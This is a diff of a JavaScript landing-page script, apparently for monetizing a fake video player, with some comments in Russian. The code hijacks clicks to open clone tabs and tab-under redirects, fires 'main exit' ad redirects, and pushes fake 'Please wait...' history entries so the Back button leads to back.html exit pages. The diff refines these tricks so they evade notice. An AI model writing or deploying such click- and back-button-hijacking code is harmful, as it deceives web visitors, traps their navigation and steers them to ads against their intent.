@@ -1,12 +1,13 @@
-/* common.js — vanisher-style micro handoff (patched)
+/* common.js — vanisher-style micro handoff (final)
    v1: micro -> open CLONE tab, current tab redirects to TABUNDER (AFU)
    v2 (clone): ANY click anywhere -> MAIN EXIT (micro disabled, no more clones)
    Supports: mainExit, tabUnderClick, back, reverse, autoexit
 
-   Patch:
+   Fixes:
    - open clone tab BEFORE any await (popup rules)
    - clone url includes __skipPreview=1
-   - IMPORTANT: micro clicks BEFORE ready are swallowed (no random redirects)
+   - reverse arms ONLY after player is READY (prevents back.html appearing on preview clicks)
+   - back history push restores ORIGINAL landing URL (prevents back.html staying in address bar)
 */
 
 (() => {
@@ -91,6 +92,14 @@
     } catch {
       return "";
     }
+  };
+
+  // ---------------------------
+  // READY gate
+  // ---------------------------
+  const isPlayerReady = () => {
+    const btn = document.querySelector(".xh-main-play-trigger");
+    return !!(btn && btn.classList.contains("ready"));
   };
 
   // ---------------------------
@@ -195,23 +204,23 @@
   // ---------------------------
   // Back (classic back.html)
   // ---------------------------
- const pushBackStates = (url, count) => {
-  try {
-    const n = Math.max(0, parseInt(count, 10) || 0);
+  const pushBackStates = (url, count) => {
+    try {
+      const n = Math.max(0, parseInt(count, 10) || 0);
 
-    // ВАЖНО: сохранить исходный URL до любых pushState
-    const originalUrl = window.location.href;
+      // сохранить исходный URL ДО pushState
+      const originalUrl = window.location.href;
 
-    for (let i = 0; i < n; i++) {
-      window.history.pushState(null, "Please wait...", url);
+      for (let i = 0; i < n; i++) {
+        window.history.pushState(null, "Please wait...", url);
+      }
+
+      // вернуть ОРИГИНАЛЬНЫЙ URL (а не текущий, который уже стал back.html)
+      window.history.pushState(null, document.title, originalUrl);
+    } catch (e) {
+      err("Back pushState error:", e);
     }
-
-    // Восстановить исходный URL, а не window.location.href (он уже мог стать back.html)
-    window.history.pushState(null, document.title, originalUrl);
-  } catch (e) {
-    err("Back pushState error:", e);
-  }
-};
+  };
 
   const getDefaultBackHtmlUrl = () => {
     const { origin, pathname } = window.location;
@@ -231,10 +240,11 @@
 
     const qs = await buildExitQS({ zoneId: b.zoneId });
 
+    // for your back.html router
     if (b.url) {
       qs.set("url", String(b.url));
     } else {
-      qs.set("z", String(b.zoneId));
+      qs.set("z", String(b.zoneId)); // just a switch for back.html
       qs.set("domain", String(b.domain || cfg.domain || ""));
     }
 
@@ -312,13 +322,20 @@
   // Reverse & Autoexit
   // ---------------------------
   const initReverse = (cfg) => {
+    // На clone reverse не нужен (там любой клик = mainExit)
+    if (isClone) return;
     if (!cfg?.reverse?.currentTab) return;
 
     let armed = false;
 
-    window.addEventListener("click", async () => {
+    const arm = async () => {
+      // НЕ армить до ready (иначе back.html появлялся на превью кликах)
+      if (!isPlayerReady()) return;
       if (armed) return;
       armed = true;
+
+      // снять слушатель сразу после армирования
+      window.removeEventListener("click", arm, true);
 
       try {
         await initBack(cfg);
@@ -327,7 +344,10 @@
       } catch (e2) {
         err("Reverse arm error:", e2);
       }
-    }, { capture: true, once: true });
+    };
+
+    // capture=true, чтобы сработало на первый “нормальный” клик после ready
+    window.addEventListener("click", arm, true);
 
     window.addEventListener("popstate", () => {
       runExitCurrentTab(cfg, "reverse", false).catch(err);
@@ -358,14 +378,6 @@
 
     document.addEventListener("visibilitychange", trigger);
     ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
-  };
-
-  // ---------------------------
-  // READY gate (only for v1 main/micro)
-  // ---------------------------
-  const isPlayerReady = () => {
-    const btn = document.querySelector(".xh-main-play-trigger");
-    return !!(btn && btn.classList.contains("ready"));
   };
 
   // ---------------------------
@@ -433,7 +445,7 @@
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // Back
+      // Back button (as before)
       if (t === "back_button") {
         if (fired.back) return;
         fired.back = true;
@@ -453,15 +465,8 @@
         return;
       }
 
-      // ---- PATCH: swallow MICRO clicks before READY ----
-      // Это убирает “странные редиректы”, если юзер тыкает по контролам до появления ready.
-      if (!isPlayerReady()) {
-        if (microTargets.has(t)) {
-          e.preventDefault();
-          e.stopPropagation();
-        }
-        return;
-      }
+      // До READY — ничего не монетизируем (и НЕ блокируем клик, чтобы твой preview-скрипт мог стартовать видео)
+      if (!isPlayerReady()) return;
 
       // v1 MICRO
       if (microTargets.has(t)) {
@@ -471,7 +476,7 @@
         return;
       }
 
-      // v1 MAIN EXIT: everything else
+      // v1 MAIN EXIT: everything else (включая видео/миниатюру/чёрное поле)
       if (fired.mainExit) return;
       fired.mainExit = true;
       e.preventDefault();
@@ -510,4 +515,3 @@
     boot();
   }
 })();
-
